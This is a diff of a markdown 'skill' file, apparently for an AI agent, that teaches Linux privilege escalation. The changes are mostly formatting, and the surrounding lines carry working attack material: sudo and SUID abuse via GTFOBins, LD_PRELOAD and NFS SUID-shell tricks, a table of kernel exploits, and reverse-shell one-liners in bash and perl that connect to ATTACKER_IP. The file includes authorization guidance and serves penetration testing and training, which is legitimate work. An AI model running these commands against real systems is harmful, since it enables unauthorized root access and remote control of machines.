@@ -1,42 +1,34 @@
 ---
-name: Linux Privilege Escalation
-description:
-  This skill should be used when the user asks to "escalate privileges on Linux", "find privesc vectors on Linux
-  systems", "exploit sudo misconfigurations", "abuse SUID binaries", "exploit cron jobs for root access", "enumerate
-  Linux systems for privilege escalation", or "gain root access from low-privilege shell". It provides comprehensive
-  techniques for identifying and exploiting privilege escalation paths on Linux systems.
+name: linux-privilege-escalation
+description: "This skill should be used when the user asks to \"escalate privileges on Linux\", \"find privesc vectors on Linux systems\", \"exploit sudo misconfigurations\", \"abuse SUID binaries\", \"ex..."
 metadata:
   author: zebbern
   version: "1.1"
+risk: unknown
+source: community
 ---
 
 # Linux Privilege Escalation
 
 ## Purpose
 
-Execute systematic privilege escalation assessments on Linux systems to identify and exploit misconfigurations,
-vulnerable services, and security weaknesses that allow elevation from low-privilege user access to root-level control.
-This skill enables comprehensive enumeration and exploitation of kernel vulnerabilities, sudo misconfigurations, SUID
-binaries, cron jobs, capabilities, PATH hijacking, and NFS weaknesses.
+Execute systematic privilege escalation assessments on Linux systems to identify and exploit misconfigurations, vulnerable services, and security weaknesses that allow elevation from low-privilege user access to root-level control. This skill enables comprehensive enumeration and exploitation of kernel vulnerabilities, sudo misconfigurations, SUID binaries, cron jobs, capabilities, PATH hijacking, and NFS weaknesses.
 
 ## Inputs / Prerequisites
 
 ### Required Access
-
 - Low-privilege shell access to target Linux system
 - Ability to execute commands (interactive or semi-interactive shell)
 - Network access for reverse shell connections (if needed)
 - Attacker machine for payload hosting and receiving shells
 
 ### Technical Requirements
-
 - Understanding of Linux filesystem permissions and ownership
 - Familiarity with common Linux utilities and scripting
 - Knowledge of kernel versions and associated vulnerabilities
 - Basic understanding of compilation (gcc) for custom exploits
 
 ### Recommended Tools
-
 - LinPEAS, LinEnum, or Linux Smart Enumeration scripts
 - Linux Exploit Suggester (LES)
 - GTFOBins reference for binary exploitation
@@ -46,14 +38,12 @@ binaries, cron jobs, capabilities, PATH hijacking, and NFS weaknesses.
 ## Outputs / Deliverables
 
 ### Primary Outputs
-
 - Root shell access on target system
 - Privilege escalation path documentation
 - System enumeration findings report
 - Recommendations for remediation
 
 ### Evidence Artifacts
-
 - Screenshots of successful privilege escalation
 - Command output logs demonstrating root access
 - Identified vulnerability details
@@ -64,7 +54,6 @@ binaries, cron jobs, capabilities, PATH hijacking, and NFS weaknesses.
 ### Phase 1: System Enumeration
 
 #### Basic System Information
-
 Gather fundamental system details for vulnerability research:
 
 ```bash
@@ -199,11 +188,11 @@ searchsploit linux kernel [version]
 
 #### Common Kernel Exploits
 
-| Kernel Version | Exploit      | CVE            |
-| -------------- | ------------ | -------------- |
-| 2.6.x - 3.x    | Dirty COW    | CVE-2016-5195  |
+| Kernel Version | Exploit | CVE |
+|---------------|---------|-----|
+| 2.6.x - 3.x | Dirty COW | CVE-2016-5195 |
 | 4.4.x - 4.13.x | Double Fetch | CVE-2017-16995 |
-| 5.8+           | Dirty Pipe   | CVE-2022-0847  |
+| 5.8+ | Dirty Pipe | CVE-2022-0847 |
 
 #### Compile and Execute
 
@@ -227,7 +216,6 @@ sudo -l
 ```
 
 #### GTFOBins Sudo Exploitation
-
 Reference https://gtfobins.github.io for exploitation commands:
 
 ```bash
@@ -249,7 +237,6 @@ sudo less /etc/passwd
 ```
 
 #### LD_PRELOAD Exploitation
-
 When env_keep includes LD_PRELOAD:
 
 ```c
@@ -284,7 +271,6 @@ find / -perm -u=s -type f 2>/dev/null
 ```
 
 #### Exploit SUID Binaries
-
 Reference GTFOBins for SUID exploitation:
 
 ```bash
@@ -409,20 +395,18 @@ gcc /tmp/nfs/shell.c -o /tmp/nfs/shell && chmod +s /tmp/nfs/shell
 ## Quick Reference
 
 ### Enumeration Commands Summary
-
-| Purpose        | Command                                 |
-| -------------- | --------------------------------------- |
-| Kernel version | `uname -a`                              |
-| Current user   | `id`                                    |
-| Sudo rights    | `sudo -l`                               |
-| SUID files     | `find / -perm -u=s -type f 2>/dev/null` |
-| Capabilities   | `getcap -r / 2>/dev/null`               |
-| Cron jobs      | `cat /etc/crontab`                      |
-| Writable dirs  | `find / -writable -type d 2>/dev/null`  |
-| NFS exports    | `cat /etc/exports`                      |
+| Purpose | Command |
+|---------|---------|
+| Kernel version | `uname -a` |
+| Current user | `id` |
+| Sudo rights | `sudo -l` |
+| SUID files | `find / -perm -u=s -type f 2>/dev/null` |
+| Capabilities | `getcap -r / 2>/dev/null` |
+| Cron jobs | `cat /etc/crontab` |
+| Writable dirs | `find / -writable -type d 2>/dev/null` |
+| NFS exports | `cat /etc/exports` |
 
 ### Reverse Shell One-Liners
-
 ```bash
 # Bash
 bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
@@ -438,7 +422,6 @@ perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getpro
 ```
 
 ### Key Resources
-
 - GTFOBins: https://gtfobins.github.io
 - LinPEAS: https://github.com/carlospolop/PEASS-ng
 - Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester
@@ -446,21 +429,18 @@ perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getpro
 ## Constraints and Guardrails
 
 ### Operational Boundaries
-
 - Verify kernel exploits in test environment before production use
 - Failed kernel exploits may crash the system
 - Document all changes made during privilege escalation
 - Maintain access persistence only as authorized
 
 ### Technical Limitations
-
 - Modern kernels may have exploit mitigations (ASLR, SMEP, SMAP)
 - AppArmor/SELinux may restrict exploitation techniques
 - Container environments limit kernel-level exploits
 - Hardened systems may have restricted sudo configurations
 
 ### Legal and Ethical Requirements
-
 - Written authorization required before testing
 - Stay within defined scope boundaries
 - Report critical findings immediately
@@ -518,9 +498,12 @@ uid=1000(user) gid=1000(user) euid=0(root)
 
 ## Troubleshooting
 
-| Issue                        | Solutions                                                                                |
-| ---------------------------- | ---------------------------------------------------------------------------------------- |
-| Exploit compilation fails    | Check for gcc: `which gcc`; compile on attacker for same arch; use `gcc -static`         |
-| Reverse shell not connecting | Check firewall; try ports 443/80; use staged payloads; check egress filtering            |
-| SUID binary not exploitable  | Verify version matches GTFOBins; check AppArmor/SELinux; some binaries drop privileges   |
-| Cron job not executing       | Verify cron running: `service cron status`; check +x permissions; verify PATH in crontab |
+| Issue | Solutions |
+|-------|-----------|
+| Exploit compilation fails | Check for gcc: `which gcc`; compile on attacker for same arch; use `gcc -static` |
+| Reverse shell not connecting | Check firewall; try ports 443/80; use staged payloads; check egress filtering |
+| SUID binary not exploitable | Verify version matches GTFOBins; check AppArmor/SELinux; some binaries drop privileges |
+| Cron job not executing | Verify cron running: `service cron status`; check +x permissions; verify PATH in crontab |
+
+## When to Use
+This skill is applicable to execute the workflow or actions described in the overview.
